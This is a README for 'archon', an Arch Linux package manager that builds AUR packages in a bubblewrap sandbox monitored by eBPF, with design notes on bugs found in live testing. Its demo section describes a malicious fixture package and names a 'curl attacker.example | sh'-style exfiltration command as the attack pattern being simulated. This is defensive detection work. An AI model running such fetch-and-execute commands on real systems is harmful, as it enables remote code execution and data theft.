@@ -1,0 +1,369 @@
+# archon
+
+A security-monitored, AUR-aware package manager for Arch Linux. archon
+resolves dependencies across the official repos and the AUR, delegates
+official installs to `pacman`, and builds AUR packages inside a bubblewrap
+sandbox whose syscalls are observed by an eBPF monitor — so a compromised
+`PKGBUILD` gets caught and reported instead of silently running as you.
+
+archon does not reimplement pacman, makepkg, or bubblewrap. It orchestrates
+them and adds two things none of them do on their own: a resolver that
+understands both official repos *and* the AUR in one dependency graph, and
+a build-time security monitor that tells you exactly what a package's
+build script did before you trust its output.
+
+## Status
+
+All four phases (resolver, sandbox, eBPF monitor, polish) are implemented,
+covered by 108 unit/integration tests, and confirmed end-to-end on a live
+Arch system:
+
+- **Resolving and installing** real dependency trees against real sync
+  databases and the real AUR RPC.
+- **Sandboxed building**: real `gcc`/`make` compilation inside bubblewrap,
+  filesystem writes confirmed confined to the package directory, network
+  confirmed unreachable during the build stage.
+- **eBPF monitoring, on a benign package** (`tty-clock`): 2713 real
+  syscall events captured across a full build — `make`, `cc`, `fakeroot`,
+  and a dozen coreutils — with zero false positives.
+- **eBPF monitoring, on a deliberately malicious package**
+  (`demo/archon-demo-evil`): correctly flagged all three planted attacks —
+  two writes outside the package's build directory and an undeclared
+  network connection — and refused to offer installation.
+
+Getting there surfaced three real bugs that only live testing could have
+found: a mount-ordering bug in the sandbox, and two successive
+cgroup-scoping bugs in the monitor (the second an honest-to-god race
+condition between two processes). All three are root-caused and fixed;
+see [Design notes](#design-notes) for what broke, how it was diagnosed,
+and why each fix holds up.
+
+## Architecture
+
+```
+                          ┌─────────────┐
+                          │  archon CLI │   clap subcommands: install / plan / build
+                          └──────┬──────┘
+                                 │
+                 ┌───────────────┼────────────────┐
+                 │               │                │
+          ┌──────▼─────┐  ┌──────▼──────┐  ┌───────▼───────┐
+          │archon-repo │  │ archon-aur  │  │archon-resolver│
+          │ sync db    │  │ AUR RPC v5  │  │  BFS + graph  │
+          │ parser     │  │  client     │  │  conflict     │
+          │(tar/gz/zst)│  │(reqwest)    │  │  detection    │
+          └──────┬─────┘  └──────┬──────┘  └───────┬───────┘
+                 │               │                 │
+                 └───────────────┴────────┬────────┘
+                                           │ InstallPlan
+                                 ┌─────────▼─────────┐
+                                 │   pacman -S/-U     │  official packages,
+                                 │  (delegated, never │  always through pacman
+                                 │   reimplemented)    │
+                                 └─────────┬───────────┘
+                                           │ AUR packages only
+                                 ┌─────────▼──────────┐
+                                 │  archon-sandbox     │  bubblewrap policy +
+                                 │  (bwrap wrapper)    │  two-stage makepkg
+                                 └─────────┬───────────┘
+                                           │ spawned, privilege-dropped
+                                 ┌─────────▼──────────┐
+                                 │  archon-monitor     │  eBPF loader (root),
+                                 │  + archon-monitor-  │  policy engine, SQLite
+                                 │    ebpf (Aya)       │  event store, report
+                                 └─────────────────────┘
+```
+
+**Crate map:**
+
+| Crate | Role |
+|---|---|
+| `archon-types` | Shared vocabulary: `Version` (libalpm `vercmp` semantics), `Dependency`, `PackageMeta`, the `PackageProvider` trait. No I/O — this is what makes the resolver unit-testable. |
+| `archon-repo` | Reads `/var/lib/pacman/sync/*.db` (tar+gzip/zstd) directly, read-only, no privileges needed. |
+| `archon-aur` | AUR RPC v5 client (`reqwest`, blocking) with response caching, including negative caching for "not on the AUR." |
+| `archon-resolver` | BFS dependency resolution across both providers, version-constraint checking, `provides=()` fallback, conflict detection, Kahn's-algorithm topological sort for AUR build order. Pure logic, tested entirely with in-memory mock providers — no live system needed. |
+| `archon-sandbox` | Builds the `bwrap` argument list (namespaces, read-only root bind, writable build dir, capability drop) and drives the two-stage `makepkg` sequence. Supports dropping privileges to a target uid/gid for the one caller (the monitored path) that needs to spawn the sandbox from a root process. |
+| `archon-monitor-common` | `#![no_std]`-compatible event structs shared between the eBPF programs and userspace — the ABI boundary. |
+| `archon-monitor-ebpf` | The actual eBPF programs (tracepoints on `sys_enter_execve`/`openat`/`connect`), built with [Aya](https://aya-rs.dev) for the `bpfel-unknown-none` target. Separate Cargo workspace (standard Aya convention — different target, needs nightly + `build-std`). |
+| `archon-monitor` | Userspace: loads/attaches the eBPF object (`aya`), the policy engine (allow-listed tools, srcdir/pkgdir write scoping, declared-source IP matching), a SQLite event store (`rusqlite`), and the build report. |
+| `archon` | The CLI binary: `clap` subcommands, terminal UX (colored plan/report output), and the orchestration that ties every crate above into `install`/`plan`/`build`. |
+
+## Prerequisites
+
+- **Arch Linux** (or an Arch derivative) — archon assumes `pacman`,
+  `/var/lib/pacman/sync`, and `makepkg` conventions.
+- **Rust stable** for everything except the eBPF crate.
+- **Rust nightly** with `rust-src`, for `archon-monitor-ebpf` only
+  (`rustup toolchain install nightly --component rust-src`).
+- **[`bpf-linker`](https://github.com/aya-rs/bpf-linker)**, for linking the
+  eBPF object (`cargo install bpf-linker`).
+- **`bubblewrap`** (`sudo pacman -S bubblewrap`) — the sandbox.
+- **cgroups v2** (unified hierarchy) — the default on any current
+  systemd-based Arch install. Check with `stat -f -c %T /sys/fs/cgroup`;
+  it should print `cgroup2fs`.
+
+## Building
+
+```sh
+# Everything except the eBPF programs (stable toolchain):
+cargo build --workspace --release
+
+# The eBPF programs (separate workspace, nightly toolchain):
+cd crates/archon-monitor-ebpf
+cargo +nightly build --release
+cd ../..
+```
+
+The two build outputs are independent on purpose — the main workspace
+never needs nightly or `bpf-linker` just to build the CLI and run its
+(non-eBPF) tests. `archon` finds the compiled eBPF object automatically in
+the dev tree, or via `$ARCHON_EBPF_OBJECT` if you've placed it elsewhere.
+
+## Usage
+
+```sh
+# See what would happen, no privileges, no side effects:
+archon plan firefox some-aur-package
+archon install firefox some-aur-package --dry-run
+
+# Resolve, confirm, install. Official packages go through `sudo pacman -S`;
+# AUR packages are cloned and built in the sandbox but NOT installed yet.
+archon install some-aur-package
+
+# Same, but monitor the AUR build with eBPF and only offer to install if
+# the report is clean. Needs root — archon re-drops privileges for the
+# actual build (makepkg refuses outright to run as root).
+sudo archon install some-aur-package --report
+
+# Build a local PKGBUILD directory (never installs it) — the way to run
+# the demo packages below.
+archon build ./demo/archon-demo-benign
+sudo archon build ./demo/archon-demo-evil --report
+```
+
+Every privileged action — `pacman -S`, `pacman -U`, loading the eBPF
+monitor — is preceded by a printed plan and an explicit `[y/N]` prompt (or
+requires `sudo` up front, which is its own confirmation). `--dry-run`
+never touches the system, period.
+
+## Demo walkthrough
+
+`demo/` has two fixture packages for exercising the monitor without
+touching the real AUR:
+
+**`archon-demo-benign`** — compiles a trivial C program with `gcc`,
+installs it under `$pkgdir`. Every syscall it makes is either on the
+policy's tool allow-list or inside the build directory.
+
+```sh
+sudo archon build ./demo/archon-demo-benign --report
+```
+
+Expected: `no policy violations — nothing flagged`.
+
+**`archon-demo-evil`** — a `PKGBUILD` that does three things a real
+AUR-malware sample might do, using harmless targets:
+
+1. Writes to `/var/tmp` and `/tmp` during `build()` — outside `$srcdir`/`$pkgdir`.
+2. Connects to `1.1.1.1:80` — a host never declared in `source=()`.
+3. Uses `curl` as a stand-in for `curl attacker.example | sh`-style exfil.
+
+```sh
+sudo archon build ./demo/archon-demo-evil --report
+```
+
+Confirmed live output (edited for length — the full report also lists a
+few makepkg/fakeroot-internal tool invocations the allow-list has since
+been extended to cover):
+
+```
+Build report for archon-demo-evil
+  3022 syscall event(s) observed
+  9 event(s) FLAGGED:
+    [!] pid=53574 comm=makepkg — wrote outside $srcdir/$pkgdir: /var/tmp/archon-evil-marker
+    [!] pid=53574 comm=makepkg — wrote outside $srcdir/$pkgdir: /tmp/archon-evil-marker
+    [!] pid=54512 comm=curl — connected to undeclared address: 1.1.1.1:80
+    ...
+
+==> build FLAGGED — see the report above. The package file, if any, was
+    left in place but you should treat it as untrusted.
+```
+
+`archon build` (unlike `install`) never offers to install anything
+regardless of the report — this demo isn't even a real package, it's a
+fixture for the monitor. Note the `/var/tmp` write is flagged even though
+the sandbox's own read-only mount independently made it fail
+(`Read-only file system`) — the monitor catches the *attempt*, which
+matters because a real attacker's target might not be read-only.
+
+## Testing
+
+```sh
+cargo test --workspace
+```
+
+108 tests, no live system or root required: `vercmp` against the reference
+ordering table, dependency-constraint satisfaction, sync-db parsing
+against hand-built fixture tarballs (plain/gzip/zstd), an AUR RPC client
+tested against a local mock HTTP server, the full resolver (diamond
+dependencies, provides-fallback, version conflicts, cycles) against
+in-memory mock providers, the bwrap argument builder (including regression
+tests locking in the mount-ordering and no-alloc cgroup-join fixes from
+live testing), the policy engine's allow/flag decisions (including the
+tool-allowlist and namespace-setup-file exemptions added after live
+testing showed real `makepkg`/`bwrap` internals being over-flagged), and
+CLI integration tests that
+exercise the compiled binary end-to-end against fixture sync databases and
+a mock AUR server (`crates/archon/tests/cli.rs`) — including one that
+actually runs a real sandboxed build via `bwrap`, skipped automatically if
+`bwrap` isn't installed.
+
+The eBPF crate (`crates/archon-monitor-ebpf`) and the loader module in
+`archon-monitor` (`src/loader.rs`) are the two pieces that need a live
+kernel and root to exercise — they're verified by actually running
+`archon build --report`, not by unit test, and `loader.rs` says so in its
+own doc comment.
+
+## Design notes
+
+### Two-stage sandboxed build
+
+`makepkg` runs in two separate `bwrap` invocations, not one:
+
+1. **Fetch** (`makepkg --nobuild`) — downloads and extracts `source=()`,
+   runs `prepare()`. Network allowed; filesystem writes confined to the
+   package directory.
+2. **Build** (`makepkg --noextract`) — runs `build()` and `package()`
+   against what stage 1 already fetched. **Network fully unshared** — a
+   compromised build script has zero egress here, verified live by having
+   a `build()` step attempt a `curl` and observing `Could not resolve
+   host`.
+
+Both stages pass `--nodeps`: archon's resolver already routed
+`depends`/`makedepends` through `pacman -S` before the sandbox starts, so
+nothing inside needs to invoke pacman or touch the system package
+database.
+
+### Mount ordering bug (found via live testing)
+
+The bwrap policy originally mounted the virtual `/dev`, `/proc`, and
+`/tmp` *before* the read-only root bind (`--ro-bind / /`). Since bwrap
+applies mounts in argument order — each one shadowing whatever's at that
+path from earlier mounts — the later root bind silently replaced the
+sandboxed `/dev` with the host's real one, and writes to `/dev/null`
+inside the sandbox failed with `EPERM` (which then surfaced as a
+confusing, unrelated `$BUILDDIR` error from `makepkg`). Fixed by binding
+root first and layering the virtual mounts on top; there's a regression
+test (`root_bind_precedes_virtual_mounts`) locking the correct order in.
+
+### Cgroup scoping, not PID propagation
+
+The eBPF monitor needs to know which processes belong to the build it's
+watching. Getting this right took three attempts, each one only failing
+in a way live testing could reveal:
+
+1. **PID propagation via tracepoint (first attempt).** Seed a map with the
+   sandbox's root PID, propagate to children via a `sched_process_fork`
+   tracepoint. Live testing showed this silently never worked — the
+   guessed byte offsets into that tracepoint's raw format never matched
+   (this sandboxed user can't read
+   `/sys/kernel/tracing/events/.../format` to confirm them ahead of time),
+   so only the top-level `bwrap` process's own setup syscalls were ever
+   observed, and everything `makepkg` and its children did was invisible.
+   That would have shipped with the tool's actual purpose defeated.
+
+2. **Cgroups, joined from the parent (second attempt).** Since the
+   monitor already needs root to load eBPF programs, archon creates a
+   dedicated cgroup per build and — from the *parent* process, right
+   after `spawn()` — moves the sandboxed process into it. Cgroup
+   membership is inherited through `fork()` by the kernel automatically,
+   so this should need no tracepoint and no offset to get wrong. It
+   didn't, for a different reason: this host's cgroup v2 mount uses the
+   `nsdelegate` option, and bubblewrap's `--unshare-cgroup` flag reacts to
+   that by creating its own private sub-cgroup and moving the sandboxed
+   process into *that* — a different (child) cgroup ID than the one the
+   monitor was told to watch. Cgroup namespace isolation isn't
+   load-bearing for this sandbox's actual security properties (that comes
+   from the mount/user/net namespaces), so the fix was to simply not pass
+   `--unshare-cgroup`.
+
+3. **The join itself raced bwrap's own fork (third attempt).** Even
+   without `--unshare-cgroup`, live testing still showed near-zero events.
+   `/proc/<pid>/cgroup` proved the tracked PID really was in the target
+   cgroup — but `bpf_get_current_cgroup_id()` for the process actually
+   doing the build's work reported a *different* ID, traced (by looking
+   up which cgroup directory had that inode) to the user's own terminal
+   emulator's systemd scope. The cause: `bwrap --unshare-pid` forks
+   internally to create the new PID namespace's init process, and that
+   fork reliably happened before the *parent* archon process completed
+   its separate `write()` to `cgroup.procs` — a race between two
+   unrelated processes, decided by whichever the scheduler ran first. The
+   forked worker inherited whatever cgroup was current at that moment
+   (wherever the invoking shell happened to be), not the one the parent
+   was about to move the supervisor PID into.
+
+   The fix that actually held up: join the cgroup from *inside* `bwrap`'s
+   own `pre_exec` — a closure that runs in the forked child after `fork()`
+   but before `execve()`, so it executes before `bwrap` (and thus its
+   internal fork) has run a single instruction. `pre_exec` forbids heap
+   allocation (it runs in a forked-but-not-yet-exec'd child, where only
+   async-signal-safe calls are permitted), so the `cgroup.procs` path is
+   precomputed as a `CString` before `spawn()`, and the pid is formatted
+   to decimal with a small hand-written no-alloc routine rather than
+   `to_string()`. Confirmed live: 3279 syscall events captured across one
+   build, versus 0 before this fix.
+
+### A settle delay before the last event drain
+
+One more live-only bug, found running the malicious demo package: the
+`WriteOutsideBuildDir` violations showed up immediately, but the
+`UndeclaredConnection` one didn't — `curl`'s attempted connection to an
+undeclared host went uncaptured even though a standalone reproduction
+confirmed `curl` really does issue a `connect()` syscall (it fails fast —
+exit code 7 — under the network-isolated build stage, but the syscall
+entry, which is what the tracepoint hooks, still happens). The build
+process exits within milliseconds of that failure, and archon's poll loop
+only did one drain immediately after `wait()` returned. Whether the gap
+was ring-buffer submission visibility or just the poll loop racing process
+teardown, the fix is the same either way: sleep 100ms before the final
+drain. Confirmed live afterward: the connection violation appeared
+correctly, every time.
+
+### Privilege separation for `--report`
+
+Loading eBPF programs needs root. `makepkg` refuses outright to run as
+root. Both are true at once, so `archon install --report` must run as
+root (via `sudo`) *and* still spawn the actual build as a normal user.
+archon resolves this by reading `$SUDO_UID`/`$SUDO_GID` (set by `sudo`,
+absent for a direct root login — which is rejected with a clear error
+rather than guessed at) and dropping privileges for the sandboxed child
+only, via a `pre_exec` closure calling `setgroups`/`setgid`/`setuid` in
+that order (dropping supplementary groups and gid while still root, uid
+last — the only safe order). The eBPF monitor, the cgroup, and the SQLite
+event store all stay root-owned/root-loaded; only the `bwrap` process
+tree drops down.
+
+### Policy engine
+
+The policy is intentionally permissive about *what* a build runs (a large
+allow-list of compilers, build-system drivers, and coreutils — false
+positives on ordinary `cmake`/`autotools` output would make every report
+noise nobody reads) and strict about *where* it writes and *who* it talks
+to:
+
+- **Exec**: flagged unless the binary's basename is on the tool allow-list
+  or the path is inside the package's own build directory (running
+  something it just built, e.g. `./configure`).
+- **Open**: only write/create/truncate opens are considered — reads of
+  system headers and libraries are normal and never flagged — and only if
+  the path is outside the build directory (`/dev/null` and `/proc/self/`
+  are exempted as universally harmless compiler/tool targets, alongside
+  the bare `uid_map`/`gid_map`/`setgroups` filenames bubblewrap's own
+  unprivileged-userns setup writes — a real false positive found and fixed
+  via live testing against the sandbox's own startup, not a build
+  script's).
+- **Connect**: flagged unless the destination IPv4 address matches one
+  resolved from the package's `.SRCINFO` `source=()` hostnames.
+  `.SRCINFO` is read specifically because it's static AUR-generated
+  metadata — sourcing the `PKGBUILD` itself just to read declared sources
+  would mean running untrusted bash before the sandbox even exists.
